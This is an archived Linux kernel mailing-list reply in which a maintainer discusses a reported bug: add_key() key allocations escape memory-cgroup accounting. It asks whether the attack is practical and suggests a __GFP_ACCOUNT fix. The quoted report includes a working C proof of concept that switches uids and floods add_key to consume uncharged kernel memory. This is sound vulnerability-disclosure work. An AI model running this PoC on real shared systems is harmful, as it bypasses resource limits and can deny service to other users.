Return-Path: <cgroups-owner@vger.kernel.org>
X-Original-To: lists+cgroups@lfdr.de
Delivered-To: lists+cgroups@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 12B9434C519
	for <lists+cgroups@lfdr.de>; Mon, 29 Mar 2021 09:40:41 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231312AbhC2HkI (ORCPT <rfc822;lists+cgroups@lfdr.de>);
        Mon, 29 Mar 2021 03:40:08 -0400
Received: from mx2.suse.de ([195.135.220.15]:37210 "EHLO mx2.suse.de"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
        id S231354AbhC2Hjp (ORCPT <rfc822;cgroups@vger.kernel.org>);
        Mon, 29 Mar 2021 03:39:45 -0400
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.com; s=susede1;
        t=1617003584; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
         mime-version:mime-version:content-type:content-type:
         content-transfer-encoding:content-transfer-encoding:
         in-reply-to:in-reply-to:references:references;
        bh=Awe1edIW7HAOiUt+RBmLfJWuVVokUbchDFh5Qge6oI8=;
        b=NUKM6iFAgfWtvIpxM1eVye/CaKKOmtbFhRt+GxNMj3mSSxxJ6JwxzDx+HN7S3qY0VIp5M7
        cfYqWae/+dJlrfwmYmTkc5g6O9SH0aExLdx7dkvk7SJBnIzJJ54i9px7+cOiRUsNF7sjGO
        CWpItdr5zzVGHzFTyeb6mZok62wNRWM=
Received: from relay2.suse.de (unknown [195.135.221.27])
        by mx2.suse.de (Postfix) with ESMTP id E8D55AE89;
        Mon, 29 Mar 2021 07:39:43 +0000 (UTC)
Date:   Mon, 29 Mar 2021 09:39:42 +0200
From:   Michal Hocko <mhocko@suse.com>
To:     =?utf-8?B?5p2o5pix5aSp?= <ytyang@zju.edu.cn>
Cc:     hannes@cmpxchg.org, vdavydov.dev@gmail.com,
        cgroups@vger.kernel.org, linux-mm@kvack.org,
        shenwenbosmile@gmail.com, David Howells <dhowells@redhat.com>,
        Jarkko Sakkinen <jarkko@kernel.org>,
        James Morris <jmorris@namei.org>,
        "Serge E. Hallyn" <serge@hallyn.com>, keyrings@vger.kernel.org,
        linux-security-module@vger.kernel.org
Subject: Re: add_key() syscall can lead to bypassing memcg limits
Message-ID: <YGGEPrYCDmSCjuun@dhcp22.suse.cz>
References: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <7d222142.1e89e.17876ab335a.Coremail.ytyang@zju.edu.cn>
Precedence: bulk
List-ID: <cgroups.vger.kernel.org>
X-Mailing-List: cgroups@vger.kernel.org

Cc keyctl maintainers

On Sun 28-03-21 10:30:34, 杨昱天 wrote:
> Hi, our team has found a bug in key_alloc() on Linux kernel v5.10.19, which leads to bypassing memcg limits.
> The bug is caused by the code snippets listed below:
> 
> /*--------------- key.c --------------------*/
> ...
> 276/* allocate and initialise the key and its description */
> 277key = kmem_cache_zalloc(key_jar, GFP_KERNEL);
> 278if (!key)
> 279goto no_memory_2;
> ...
> /*---------------- end ---------------------*/
> 
> /*------------- keyctl.c -------------------*/
> ...
> 95  if (_description) {
> 96description = strndup_user(_description, KEY_MAX_DESC_SIZE);
> 97if (IS_ERR(description)) {
> ...
> /*--------------- end ---------------------*/
> 
> Each user can allocate ~20KB uncharged memory by calling add_key syscall to trigger the listed code.
> Code at line 277 in the first snippet allocates a new struct key object that is not charged by memcg, as no accouting flag is passed to neither the
> allocation site here nor the key_jar's creating site. At line 96 in the second snippet, we found that memory used by description of a key, 
> which has a maximum size of 4096 bytes, is also not charged. A user can allocate multiple keys and consume more uncharged memory. 
> The upper limit of key memory's size is set to 20,000 bytes by default for each user.
> 
> The bug can cause severe memcg limit bypassing if a process can change its uid and bypass the above limit. For example, a user may own root privilege 
> in its user namespace and leverage seteuid() syscall to continuously change its uid. 
> Our evaluation on QEMU v5.1.0 + cgroup v2 shows that, under this assumption, we could consume ~2.2G memory by allocating keys from 100,000 different uids, while the memory charged by memcg is ~215MB.

Can the user/attacker create all those different uids? Or what would be
a typical scenario where this a threat? In other words is this a
practical attack vector?

If yes then the mitigation woulld be quite easy for the key_jar (just
add __GFP_ACCOUNT). I am not aware we would have strndup_user
alternative with kemecg enabled so this would have to be added.

> 
> The PoC code is listed below:
> 
> /*--------------- PoC --------------------*/
> #include <asm/unistd.h>
> #include <linux/keyctl.h>
> #include <unistd.h>
> #include <stdio.h>
> #include <string.h>
> #include <stdlib.h>
> #include <time.h>
> 
> char desc[4000];
> void alloc_key_user(int id) {
>   int i = 0, times = -1;
>   __s32 serial = 0;
>   int res_uid = seteuid(id);
>   if (res_uid == 0)
>     printf("uid allocation success on id %d!\n", id);
>   else {
>     printf("uid allocation failed on id %d!\n", id);
>     return;
>   }
>   srand(time(0));
>   while (serial != 0xffffffff) {
>     ++times;
>     for (i = 0; i < 3900; ++i)
>       desc[i] = rand()%255 + 1;
>     desc[i] = '\0';
>     serial = syscall(__NR_add_key, "user", desc, "payload",
>       strlen("payload"), KEY_SPEC_SESSION_KEYRING);
>   }
>   printf("allocation happened %d times.\n", times);
>   seteuid(0);
> }
> 
> int main() {
>   int loop_times = 0;
>   int start_uid = 0;
>   scanf("%d %d", &start_uid, &loop_times);
>   for (int i = 0; i < loop_times; ++i) {
>     alloc_key_user(i+start_uid);
>   }
>   return 0;
> }
> 
> /*-------------PoC end ---------------------*/
> 
> Thanks!
> 
> Best regards,
> Yutian Yang

-- 
Michal Hocko
SUSE Labs
